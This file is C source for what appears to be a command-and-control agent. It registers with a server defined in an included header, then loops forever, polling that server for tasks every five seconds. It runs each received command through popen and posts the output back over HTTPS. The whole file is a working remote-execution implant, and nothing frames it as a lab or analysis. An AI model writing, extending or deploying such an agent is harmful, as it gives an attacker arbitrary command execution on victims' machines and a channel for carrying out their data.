#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include "./reqs.h"
#include "global.h"

char agent_id[64] = {0};

void register_agent() {
    const char *payload = "{\"hostname\":\"my-agent\",\"ip\":\"127.0.0.1\"}";
    char response[2048] = {0};
    https_post(SERVER, PORT, REGISTER_ENDPOINT, payload, response, sizeof(response));

    char *id_ptr = strstr(response, "\"id\":\"");
    if (id_ptr) {
        sscanf(id_ptr, "\"id\":\"%63[^\"]", agent_id);
        printf("[+] Registered. Agent ID: %s\n", agent_id);
    }
}

void send_result(const char *task_id, char *output) {
    if (output[strlen(output) - 1] == '\n') {
        output[strlen(output) - 1] = '\0';
    }    
    char post_data[2048];
    snprintf(post_data, sizeof(post_data),
             "{\"agent_id\":\"%s\",\"task_id\":\"%s\",\"output\":\"%s\"}",
             agent_id, task_id, output);
    
    char resp[2048] = {0};
    https_post(SERVER, PORT, RESULTS_ENDPOINT, post_data, resp, sizeof(resp));
}

void poll_and_execute() {
    char url[256];
    snprintf(url, sizeof(url), "%s%s", TASKS_ENDPOINT, agent_id);

    while (1) {
        char response[4096] = {0};
        https_get(SERVER, PORT, url, response, sizeof(response));

        char *task = strstr(response, "\"id\":\"");
        while (task) {
            char task_id[64], command[512];
            if (sscanf(task, "\"id\":\"%63[^\"]\",\"command\":\"%511[^\"]", task_id, command) == 2) {
                printf("[>] Task received: %s\n", command);
                char result[1024] = {0};
                FILE *fp = popen(command, "r");
                if (fp) {
                    fread(result, 1, sizeof(result) - 1, fp);
                    pclose(fp);
                }
                send_result(task_id, result);
            }
            task = strstr(task + 1, "\"id\":\"");
        }

        sleep(5);
    }
}

int main() {
    register_agent();
    if (strlen(agent_id) > 0) {
        poll_and_execute();
    }
    return 0;
}
